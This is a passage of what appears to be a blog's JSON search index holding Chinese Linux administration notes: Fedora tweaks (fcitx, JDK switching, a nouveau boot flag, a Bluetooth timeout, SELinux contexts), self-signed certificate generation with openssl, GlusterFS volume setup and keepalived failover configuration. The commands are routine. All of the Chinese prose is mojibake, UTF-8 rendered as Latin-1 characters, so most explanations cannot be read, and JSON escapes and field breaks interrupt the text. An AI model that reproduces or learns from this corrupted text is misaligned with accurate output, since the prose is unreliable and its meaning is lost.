æƒé™ç®¡ç†å·¥å…· # https://flathub.org/zh-Hans/apps/io.github.giantpinkrobots.flatsweep # flatpak å¸è½½æ®‹ç•™æ¸…ç†å·¥å…·(fedora38ä¸‹è¿è¡Œä¸ç¨³å®š) 5. å®‰è£…ficxè¾“å…¥æ³• https://blog.csdn.net/qq23425352/article/details/107379335 $\u003e # fcitx $\u003e sudo dnf install fcitx fcitx-{ui-light,qt{4,5},table,gtk{2,3},table-chinese,configtool,sunpinyin} # fcitx5 $\u003e sudo dnf install fcitx5 fcitx5-{qt{5,6},configtool,gtk{2,3,4},lua,rime,table-extra,table-other,chinese-addons} $\u003e sudo vim /etc/profile.d/fcitx.sh export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" # å¼€æœºå¯åŠ¨é¡¹ æ·»åŠ fcitx ï¼Œç„¶åé‡å¯ 6. fedroaä¸‹å¤šjdkåˆ‡æ¢æ–¹æ¡ˆ [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --config java å…±æœ‰ 3 ä¸ªæä¾›â€œjavaâ€çš„ç¨‹åºã€‚ é€‰é¡¹ å‘½ä»¤ ----------------------------------------------- * 1 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-10.b14.fc25.x86_64/jre/bin/java) 2 /opt/jdk1.8.0_121/bin/java æŒ‰ Enter ä¿ç•™å½“å‰é€‰é¡¹[+]ï¼Œæˆ–è€…é”®å…¥é€‰é¡¹ç¼–å·ï¼š2 7. ç³»ç»Ÿbugä¼˜åŒ–-æ˜¾å¡ æ­¤æ–¹æ³•è§£å†³äº†nouveau å¯¹äºnvidiaæ˜¾å¡æ”¯æŒä¸å¥½ä»è€Œå¯¼è‡´äº†gnomeåœ¨é”å±çŠ¶æ€å¡æ­»,ä»è€Œæ— æ³•ç™»é™†æ¡Œé¢,åªèƒ½é‡å¯æ“ä½œç³»ç»Ÿ (åŒæ˜¾å¡ç”µè„‘). # 1. ä¿®æ”¹æ–‡ä»¶ /etc/default/grub # 2. ä¿®æ”¹è¡Œ GRUB_CMDLINE_LINUX åœ¨æœ«å°¾æ·»åŠ  nouveau.modeset=0 # 3. æ›´æ–°gurb: grub2-mkconfig -o /boot/grub2/grub.cfg # 4. é‡å¯ 8. ç³»ç»Ÿbugä¼˜åŒ–-è“ç‰™ è¿™ä¹Ÿå¯èƒ½ä¸æ˜¯ä¸€ä¸ªbug,å…·ä½“é—®é¢˜æ˜¯è“ç‰™é¼ æ ‡è¿æ¥åä¸€æ®µæ—¶é—´æœªä½¿ç”¨ç”µè„‘å’Œé¼ æ ‡,è“ç‰™å°†ä¼šè‡ªåŠ¨è¢«æ–­å¼€,ä½†ç³»ç»Ÿä»ç„¶æ˜¾ç¤ºè¿æ¥ä¸­,æ‰‹åŠ¨æ–­å¼€åä¹Ÿæ— æ³•åœ¨è¿›è¡Œè¿æ¥,åªèƒ½åˆ é™¤åŸæœ‰è¿æ¥ç„¶åé‡æ–°é…å¯¹, å¤šæ¬¡æŸ¥è¯¢ç›¸å…³æ— æœåå¯¹è“ç‰™çš„ç›¸å…³é…ç½®æ–‡ä»¶è¿›è¡Œæ£€æŸ¥,å‘ç°ç³»ç»Ÿè®¾ç½®é‡Œé¢å¯¹äºè“ç‰™æœ‰DiscoverableTimeoutè¿™ä¹ˆä¸€ä¸ªå‚æ•°,æ­¤å‚æ•°ä½œç”¨æ˜¯è®¾ç½®è“ç‰™ä¿æŒå‘ç°çš„æœ€é•¿æ—¶é—´,é»˜è®¤180ç§’. ä¿®æ”¹æ­¤å‚æ•°åé—®é¢˜è§£å†³. # è§£å†³æ–¹æ¡ˆ # 1. ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/bluetooth/main.conf # 2. ä¿®æ”¹ DiscoverableTimeout=0 # å¦: fedoraå®˜ç½‘wikiæä¾›äº†å¦ä¸€ç§è§£å†³æ–¹æ¡ˆ,è¯´çš„å¤§æ¦‚æ˜¯å¤§éƒ¨åˆ†çš„è‡ªåŠ¨æ–­å¼€éƒ½æ˜¯å› ä¸ºè“ç‰™æœåŠ¡æœªä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œ,è§£å†³æ–¹æ¡ˆæ˜¯ ## https://fedoraproject.org/wiki/How_to_debug_Bluetooth_problems#Simple_debugging # 1. ä¿®æ”¹é…ç½®æ–‡ä»¶ /usr/lib/systemd/system/bluetooth.service # 2. ä¿®æ”¹å‚æ•° ExecStart åœ¨æœ«å°¾æ·»åŠ  -d # é‡å¯ systemctl restart bluetooth.service 9. systemd æ·»åŠ åæ— æƒé™å¯åŠ¨é—®é¢˜ .service: Failed to execute command: Permission denied æ­¤é—®é¢˜å®é™…ä¸Šæ˜¯ç”±äºselinuxå¼€å¯enforcing(å¼ºåˆ¶æ¨¡å¼)å¯¼è‡´çš„,ä¸€èˆ¬çš„fedoraç”¨æˆ·åº”è¯¥éƒ½ä¸ä¼šå»å…³é—­selinuxå§ï¼Œåªæœ‰åœ¨æœåŠ¡å™¨ä¸Šä¸ºäº†æ–¹ä¾¿æ‰ä¼šå»å…³é—­,è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å…³é—­selinux,æˆ–è€…å°†selinuxè®¾ç½®ä¸ºpermissive(å®½å®¹æ¨¡å¼),ç¬¬äºŒç§å°±æ˜¯ç›´æ¥ä¿®æ­£ä¸Šä¸‹æ–‡æƒé™ä¸ºbin_t,è¿™ä¸ªå…·ä½“å¯ä»¥çœ‹ä¸‹ç³»ç»Ÿä¸­å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸Šä¸‹æ–‡æƒé™æ˜¯ä»€ä¹ˆ(ls -Z),ä¿®æ”¹å‘½ä»¤æ˜¯chcon -t bin_t \u003cbinaryfile\u003e,å¦å¤–.serviceå‘½ååœ¨systemdé…ç½®ç›®å½•ä¸­äº†ï¼Œsystemctl statusæ—¶å´çœ‹ä¸åˆ°,ä¹Ÿæ˜¯è¿™ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜ä¹Ÿæ˜¯æˆ‘ç›´æ¥å¤åˆ¶v2rayçš„æ—¶å€™å‘ç°çš„ï¼Œè¿™å„¿è®°å½•ä¸‹. 10. fedora 32 å¯ç”¨ docker https://linux.cn/article-12433-1.html 11. fedora 33 ä¸‹ä¿®æ”¹Waylandæ¡Œé¢ä¸º","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:0:0","tags":["linux","fedora"],"title":"Fedoraä¼˜åŒ–","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"è‡ªç­¾è¯ä¹¦çš„ç”ŸæˆåŠå¯ä¿¡åˆ—è¡¨çš„æ·»åŠ ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"è‡ªç­¾è¯ä¹¦çš„ç”ŸæˆåŠå¯ä¿¡åˆ—è¡¨çš„æ·»åŠ ","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. æ­£æ–‡ 1.1. ç”Ÿæˆ CA ç§é’¥ # æ­¤å¤„éœ€è¦è®©ä½ è®¾ç½®ä¸€ä¸ªå¯†ç (å¥½åƒå¯ä»¥ç›´æ¥å¿½ç•¥å¯†ç ,ä½†ä¸æ™“å¾—æ€ä¹ˆæ“ä½œ) ## openssl genrsa -out ca.key 4096 openssl genrsa -des3 -out ca.key 4096 # ç§»é™¤å‡ºç§é’¥å¯†ç  openssl rsa -in ca.key -out ca.key 1.2. ç”Ÿæˆ ca è¯ä¹¦ subj å‚æ•°è¯´æ˜ å­—æ®µ å­—æ®µå«ä¹‰ ç¤ºä¾‹ /C= Country å›½å®¶ CN /ST= State or Province çœ Chongqing /L= Location or City åŸå¸‚ Shapingba /O= Organization ç»„ç»‡æˆ–ä¼ä¸š 0x5c0f /OU= Organization Unit éƒ¨é—¨ ops /CN= Common Name åŸŸåæˆ–IP blog.0x5c0f.cc openssl req -utf8 -x509 -new -nodes -key ca.key -sha512 -days 18250 -out ca.pem -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f/emailAddress=mail@0x5c0f.cc\" 1.3. ç”Ÿæˆè¯ä¹¦ç§é’¥ openssl genrsa -out server.key 4096 1.4. ç”ŸæˆåŸŸåç­¾å openssl req -new -key server.key -out server.csr -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f.cc/emailAddress=mail@0x5c0f.cc\" 1.5. åˆ›å»ºæ‰©å±• åç»­æœ‰æ–°åŸŸå,ç›´æ¥åŠ å…¥è¿›å»å³å¯ cat \u003e server.ext \u003c\u003cEOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth, codeSigning subjectAltName = @alt_names [alt_names] DNS.1 = *.0x5c0f.cc DNS.2 = *.51ac.cc DNS.3 = localhost IP.1 = 127.0.0.1 EOF 1.6. ç”ŸæˆåŸŸåè¯ä¹¦ openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 1825 -sha512 -extfile server.ext 1.7. å¯ä¿¡åˆ—è¡¨æ·»åŠ  1.7.1. linux https://qastack.cn/unix/90450/adding-a-self-signed-certificate-to-the-trusted-list ä»¥fedroa32ä¸ºä¾‹ sudo cp -v ca.pem /etc/pki/ca-trust/source/anchors/ca.pem sudo update-ca-trust 1.7.2. windows ä»¥win 10ä¸ºä¾‹ win + R æ‰“å¼€è¿è¡Œçª—å£, é”®å…¥ mmc ç„¶åå›è½¦, é€‰æ‹© æ–‡ä»¶-æ·»åŠ /åˆ é™¤å•å…ƒèŠ‚ç‚¹ã€‚é€‰æ‹©è¯ä¹¦-æ·»åŠ ï¼Œæ‰“å¼€é€‰é¡¹å¡è‡ªè¡Œåˆ¤æ–­é€‰æ‹©ï¼Œå®Œæˆå³å¯ã€‚ ä¸Šè¿°å®Œæˆåï¼Œåœ¨mmcæ§åˆ¶å°ä¸­å°±å¯ä»¥çœ‹åˆ°è¯ä¹¦èŠ‚ç‚¹, å±•å¼€è¯ä¹¦-å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„ï¼Œé€‰æ‹©å…¶ä¸‹é¢è¯ä¹¦,ç„¶åå³é”® æ‰€æœ‰ä»»åŠ¡-å¯¼å…¥,å¯¼å…¥ç”Ÿæˆçš„ca.pemå³å¯ï¼Œé€€å‡ºæ—¶ä¼šæç¤ºå­˜å‚¨æ§åˆ¶å°çš„ä¿¡æ¯ï¼Œå¯ä»¥å¿½ç•¥ ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"è‡ªç­¾è¯ä¹¦çš„ç”ŸæˆåŠå¯ä¿¡åˆ—è¡¨çš„æ·»åŠ ","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ_GlusterFS","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/","tags":["linux","glusterfs"],"title":"åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å‰è¨€ åˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨ å®éªŒç¯å¢ƒï¼š 1. centos7.x 2å° (node11ï¼Œnode12) 2. glusterfs 4.1.6 2. å®‰è£… 2.1. åŸºç¡€ç¯å¢ƒé…ç½® å…³é—­é˜²ç«å¢™ å…³é—­selinux ç»Ÿä¸€ä¸»æœºåç§°(ä¿è¯å”¯ä¸€ä¸»æœºå) æ·»åŠ hostsè§£æ 2.2. å®‰è£… æ¯ä¸ªèŠ‚ç‚¹æœºå™¨å‡éœ€è¦å®‰è£…å¹¶å¯åŠ¨ï¼š [root@node11 ~]# yum install epel-release # epel æº [root@node11 ~]# yum install centos-release-gluster40 # å®‰è£…gluster æº [root@node11 ~]# yum install glusterfs-server glusterfs-geo-replication #å®‰è£…gluster [root@node11 ~]# glusterfs -V # æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ glusterfs 4.1.6 Repository revision: git://git.gluster.org/glusterfs.git Copyright (c) 2006-2016 Red Hat, Inc. \u003chttps://www.gluster.org/\u003e GlusterFS comes with ABSOLUTELY NO WARRANTY. It is licensed to you under your choice of the GNU Lesser General Public License, version 3 or any later version (LGPLv3 or later), or the GNU General Public License, version 2 (GPLv2), in all cases as published by the Free Software Foundation. [root@node11 ~]# systemctl start glusterd # å¯åŠ¨ [root@node11 ~]# systemctl enable glusterd # åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ 3. é…ç½® 3.1. å°†å­˜å‚¨ä¸»æœºåŠ å…¥å­˜å‚¨ä¿¡ä»»æ±  # å°†å­˜å‚¨ä¸»æœºåŠ å…¥å­˜å‚¨ä¿¡ä»»æ± ï¼Œä»»æ„ä¸€ä¸ªèŠ‚ç‚¹æ·»åŠ éå½“å‰èŠ‚ç‚¹çš„èŠ‚ç‚¹å³å¯ # å¦‚ï¼šnode11,node12,node13(ä¸»æœºåˆ«å) ,åœ¨node11 æ·»åŠ  node12,node13ã€‚æˆ–åœ¨node12 æ·»åŠ  node11,node13 ... [root@node11 ~]# gluster peer probe node12 peer probe: success. 3.2. æŸ¥çœ‹çŠ¶æ€ [root@node11 ~]# gluster peer status Number of Peers: 1 Hostname: node12 Uuid: 1bf6ec90-7130-48db-86e8-acb38abc6b40 State: Peer in Cluster (Connected) ############ [root@node12 ~]# gluster peer status Number of Peers: 1 Hostname: node11 Uuid: 4f2833b8-a117-4540-8e29-691a6849737e State: Peer in Cluster (Connected) 3.3. åˆ›å»ºvolume å· åˆ›å»ºvolume åŠå…¶ä»–æ“ä½œ åˆ†å¸ƒå·(Distributed)ï¼š æ–‡ä»¶é€šè¿‡hashç®—æ³•éšæœºçš„åˆ†å¸ƒåˆ°æœ‰bricksç»„æˆçš„å·ä¸Š,æ˜¯æ–‡ä»¶åˆ†æ•£å­˜å‚¨ å¤åˆ¶å·(Replicated) : ç±»ä¼¼raid1, replica æ•°å¿…é¡»ç™»å½•volumeä¸­birckæ‰€åŒ…å«çš„å­˜å‚¨æœåŠ¡å™¨æ•°ï¼Œå¯é«˜å¯ç”¨ æ¡å¸¦å·(Striped) : ç±»ä¼¼raid0ï¼Œstripeæ•°å¿…é¡»ç­‰äºvolumeä¸­brickæ‰€åŒ…å«çš„å­˜å‚¨æœåŠ¡å™¨æ•°ï¼Œæ–‡ä»¶è¢«åˆ†æˆæ•°æ®å—ï¼Œä»¥round robinçš„æ–¹å¼å­˜å‚¨åœ¨bricksä¸­ï¼Œå¹¶å‘ç²’åº¦æ˜¯æ•°æ®å—ï¼Œå¤§æ–‡ä»¶æ€§èƒ½å¥½ã€‚ åˆ†å¸ƒå¼å·ã€åˆ†å¸ƒå¼å¤åˆ¶å·(ä¸»è¦ä½¿ç”¨)ã€åˆ†å¸ƒå¼æ¡å¸¦å·(ä¸å»ºè®®ä½¿ç”¨)å³ç»„åˆ 3.3.1. åˆ†å¸ƒå¼æŒ‚è½½å· ç±»ä¼¼raid0,ä½†æ˜¯æ˜¯æ–‡ä»¶åˆ†æ•£å­˜å‚¨ï¼Œè€Œä¸æ˜¯æ–‡ä»¶è¢«æ‹†åˆ†ä¸ºå—åˆ†æ•£å­˜å‚¨ 3.3.1.1. åˆ›å»º # åˆ›å»ºæŒ‚è½½ç›®å½•(è¿™ä¸ªç›®å½•å°±æ˜¯æ•°æ®ç›˜çš„æŒ‚è½½ç›®å½•,æˆ‘ä½†æœåŠ¡å™¨æ€»å…±æŒ‚è½½äº†6å—ç›˜ï¼Œç”¨æ¥æµ‹è¯•) [root@node11 ~]# mkdir -p /data/node1{1..3} /data/node{1..3}1 ## store: ç›¸å½“äºé€»è¾‘å·çš„é‚£ä¸ªåˆ«å ## node11ã€node12 å°±æ˜¯ä¸»æœºåç§°,ä¹Ÿå¯ä»¥æ˜¯ip ## /data/node1 æ˜¯æŒ‚è½½çš„ç›®å½•ï¼Œåº”è¯¥æ˜¯ç›¸å½“äºnfsè¿œç¨‹æŒ‚è½½çš„æœ¬åœ°è·¯å¾„(æ­¤å¤„æŒ‡çš„æ˜¯å­˜å‚¨ç£ç›˜ï¼Œå»ºè®®æ¯ä¸ªèŠ‚ç‚¹æœåŠ¡å™¨çš„å­˜å‚¨åç§°ä¸€è‡´ï¼Œæ–¹ä¾¿åŒºåˆ†) [root@node11 ~]# gluster volume create store1 node11:/data/node1 node12:/data/node1 force # åˆ›å»ºåˆ†å¸ƒå· volume create: store1: success: please start the volume to access data 3.3.1.2. å¯åŠ¨ [root@node11 ~]# gluster volume start store1 # å¯åŠ¨å· volume start: store1: success 3.3.1.3. æŸ¥çœ‹ [root@node11 ~]# gluster volume info store1 # æŸ¥çœ‹å·(node1) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### [root@node12 ~]# gluster volume info store1 # æŸ¥çœ‹å·(node2) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### 3.3.1.4. æŒ‚è½½ /etc/fstab: localhost:/store1 /mnt glusterfs defaults,_netdev 0 0 # ä»¥glusterfsçš„å½¢å¼æŒ‚è½½(node1å¯ä»¥æ˜¯ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹çš„åç§°æˆ–ipï¼Œå¦å¤–è¿˜æœ‰ä¸€ç§æ˜¯nfså½¢å¼æŒ‚è½½ï¼Œä½†è¯¥æ–¹æ³•æŒ‚è½½æœªæµ‹è¯•æˆåŠŸè¿‡ï¼Œ # æ­¤å¤„å°±ä¸è¯´æ˜äº†ï¼Œå¦‚æœæœ‰é‡åˆ°è¿‡åŒæ ·é—®é¢˜å¹¶è§£å†³äº†ï¼Œæ¬¢è¿æŒ‡å‡º) [root@node1 ~]# mount -t glusterfs node1:/store1 /mnt [root@node1 ~]# df -h # æˆ‘æ˜¯ä¸€ä¸ª200gçš„ç›˜ï¼Œä¸€ä¸ª20Gçš„ç›˜ï¼Œåˆå¹¶å·åå¯ä»¥çœ‹åˆ°æ€»å…±220Gï¼Œå› ä¸ºæˆ‘æ˜¯ä¸¤ä¸ªç›˜ä¸‹é¢çš„ä¸€ä¸ªç›®å½•æ¥åšçš„å®éªŒï¼Œæ‰€æœ‰å­˜åœ¨è¾ƒå¤§çš„ä½¿ç”¨ç©ºé—´(å®é™…ç©ºç›˜åˆ›å»ºååªä¼šæœ‰å·çš„ç¼“å­˜ç›®å½•å­˜åœ¨,å¤§æ¦‚å‡ åMå·¦å³) Filesystem Size Used Avail Use% Mounted on ## çœç•¥ ## node1:/store 218G 11G 207G 6% /mnt # åœ¨æŒ‚è½½ç›®å½•ä¸‹åˆ›å»ºå¤šä¸ª(å¦‚ï¼š100ä¸ª)æµ‹è¯•æ–‡ä»¶ï¼Œé‚£ä¹ˆ/mnt(å³æŒ‚è½½ç›®å½•)æ–‡ä»¶æ€»ä¸ªæ•°100ï¼Œå®é™…node1çš„/data/node1ç›®å½•90ä¸ªï¼Œnode2çš„/data/node1ç›®å½•10ä¸ªï¼Œ # ä»–æ˜¯é€šè¿‡hashç®—æ³•åˆ†é…æ–‡ä»¶å­˜æ”¾ä½ç½®çš„ï¼Œä»¥ä¸Šä»…æ˜¯æˆ‘ä¸ªäººçš„æµ‹è¯•æ•°æ®ç»“æœ 3.3.2. åˆ†å¸ƒå¼å¤åˆ¶å· è¿‘ä¼¼raid1ï¼š 3.3.2.1. åˆ›å»º [root@node1 ~]# mkdir /data/node2 # å’Œåˆ†å¸ƒå·æè¿°ä¸€æ ·ï¼Œå‡è£…ä»–æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç›˜ï¼Œç”¨æ¥æµ‹è¯•çš„ # replica 2: ä»£è¡¨å¤åˆ¶å·çš„ä¸ªæ•°ï¼Œè¿™ä¸ªå€¼éœ€è¦å’Œåé¢nodeèŠ‚ç‚¹é…ç½®çš„èŠ‚ç‚¹ä¸ªæ•°ä¸€è‡´ [root@node1 ~]# gluster volume create store2 replica 2 node1:/data/node2 node2:/data/node2 force volume create: store2: success: please start the volume to access dat","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:0:0","tags":["linux","glusterfs"],"title":"åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Keepaliveå®‰è£…é…ç½®","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","keepalive"],"title":"Keepaliveå®‰è£…é…ç½®","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å®‰è£…å‰éœ€æ£€æŸ¥åé¡¹ä»£ç†æ˜¯å¦æ­£å¸¸ yum install keepalived é…ç½®æ–‡ä»¶è¯´æ˜ /etc/keepalived/keepalived.conf ä¸»å¤‡èŠ‚ç‚¹é…ç½®åŸºæœ¬ä¸€è‡´,éœ€ä¿®æ”¹çš„ä»…æœ‰ router_id , state ï¼Œpriority # GLOBAL CONFIGURATION # å…¨å±€é…ç½® ä»…ä¿ç•™router_id å³å¯, router_id ä¸ºé«˜å¯ç”¨é›†ç¾¤æˆå‘˜ID,ID å”¯ä¸€ # VRRPD CONFIGURATION # vrrpd é…ç½® vrrp_instance VI_1 { # å®šä¹‰å®ä¾‹ä¿¡æ¯ï¼ŒåŒä¸»å¤‡èŠ‚ç‚¹å®ä¾‹æ ‡è¯†ç›¸åŒ(å”¯ä¸€) state MASTER # å®šä¹‰å®ä¾‹ä¸­ä¸»å¤‡çŠ¶æ€è§’è‰²(MASTER/BACKUP),ä»…ä¸ºæ ‡è¯†è€Œå·² interface eth1 # è®¾ç½®ä¸»å¤‡æœåŠ¡å™¨è™šæ‹Ÿipæ”¾ç½®ç½‘å¡ä½ç½® virtual_router_id 51 # è™šæ‹Ÿè·¯ç”±IDæ ‡è¯†ï¼Œä¸åŒå®ä¾‹ä¸åŒï¼Œå„ä¸ªä¸»å¤‡èŠ‚ç‚¹ç›¸åŒ(0-255) priority 100 # è®¾ç½®æŠ¢å ä¼˜å…ˆçº§ï¼Œæ•°å€¼è¶Šå¤§è¶Šä¼˜å…ˆ(1-254) advert_int 1 # ä¸»å¤‡é€šè®¯æ—¶é—´é—´éš”(s) authentication { # ä¸»å¤‡é—´é€šè¿‡è®¤è¯å»ºç«‹è¿æ¥ auth_type PASS auth_pass 1111 } virtual_ipaddress { # å®šä¹‰ä¸»å¤‡æœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨çš„è™šæ‹ŸIPåœ°å€ä¿¡æ¯(VIP)ï¼Œä¸€èˆ¬æ¥è¯´ä¸€ä¸ªå®ä¾‹å¯¹åº”ä¸€ä¸ªæœåŠ¡ï¼Œä¸€ä¸ªæœåŠ¡ç›‘å¬é…ç½®çš„å›ºå®šVIP 192.16.10.5/24 dev eth1 label eth1:1 } } # LVS CONFIGURATION # ç›¸å½“äºnginxçš„éƒ¨åˆ† è„‘è£‚ï¼šåªè¦å¤‡æœåŠ¡å™¨æ”¶ä¸åˆ°ä¸»çš„ç»„æ’­åŒ…ï¼Œå¤‡å°±ä¼šæˆä¸ºä¸»,è€Œä¸»èµ„æºæœªé‡Šæ”¾ åŸå›  é˜²ç«å¢™ å¤šèŠ‚ç‚¹é—´çš„ç½‘ç»œå‡ºç°æ•…éšœ virtual_router_id é…ç½®æ•°å€¼ä¸æ­£ç¡® è§£å†³æ–¹æ¡ˆ ä¸€èˆ¬æ¥è¯´,åªè¦å¤‡èŠ‚ç‚¹å‡ºç°VIPå°±è¡¨ç¤ºä¸æ­£å¸¸ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½æ˜¯æ­£å¸¸çš„ä¸»å¤‡åˆ‡æ¢ï¼Œå¦‚æœä¸æ˜¯æ­£å¸¸çš„åˆ‡æ¢ï¼Œ é‚£ä¹ˆå¯èƒ½æ˜¯å½“å‰èŠ‚ç‚¹æ•…éšœæˆ–è€…å½“å‰èŠ‚ç‚¹ä¸ä¸»èŠ‚ç‚¹çš„é€šä¿¡é—®é¢˜ï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªè„šæœ¬å‘¨æœŸæ€§æ£€æŸ¥å½“å‰èŠ‚ç‚¹ ä¸ç½‘å…³çš„è¿æ¥æ€§ï¼Œä¸é€šï¼Œåˆ™åº”è¯¥æ˜¯è‡ªèº«é—®é¢˜(å†™ä¸ªå¾ªç¯pingç½‘å…³ï¼Œä¸é€šå…³é—­keepaliveï¼Œé€šè¿‡æ‰“å¼€keepalive) å»ºç«‹nginxä¸keepalivedçš„å…³è” nginx å­˜æ´»æ£€æµ‹(ç¤ºä¾‹ï¼Œå®é™…å¯èƒ½éœ€è¦æ›´ä¸ºè¯¦ç»†çš„æ£€æµ‹è„šæœ¬) ï¼Œå®Œæˆåéœ€è¦ä¿®æ­£keepalive.serviceåœ¨nginx.serviceåå¯åŠ¨ #!/bin/bash systemctl is-active nginx.service \u003e\u0026 /dev/null || { systemctl stop keepalived.service } ä¿®æ”¹é…ç½® /etc/keepalived/keepalived.conf vrrp_script check_web { # å‡½æ•°å(éœ€æ”¾åˆ°å®ä¾‹ä¸å…¨å±€ä¹‹é—´) script \"/opt/sh/check_nginx_status.sh\" # ç›‘æ§è„šæœ¬(éœ€æœ‰æ‰§è¡Œæƒé™) interval 2 # æ£€æŸ¥æ—¶é—´é—´éš”(s) # weight 2 # ç”¨äºä¸æ‰§è¡Œç»“æœåˆ¤æ–­è€Œè°ƒæ•´ä¼˜å…ˆçº§çš„ } track_script { # è°ƒç”¨é…ç½®çš„å‡½æ•°è„šæœ¬ï¼ˆæ”¾åˆ°å®ä¾‹é…ç½®é‡Œé¢ï¼‰ check_web } åŒä¸»(æˆ–äº’ä¸ºä¸»å¤‡) å®ç°å°±æ˜¯åœ¨ä¸¤ä¸ªèŠ‚ç‚¹ä¸­åœ¨æ·»åŠ ä¸€ä¸ªå®ä¾‹ï¼Œä¿®æ”¹stateï¼Œpriorityï¼Œå’ŒVIP ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","keepalive"],"title":"Keepaliveå®‰è£…é…ç½®","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Chrootç³»ç»Ÿ,ç”¨äºé™åˆ¶sftpçš„æ 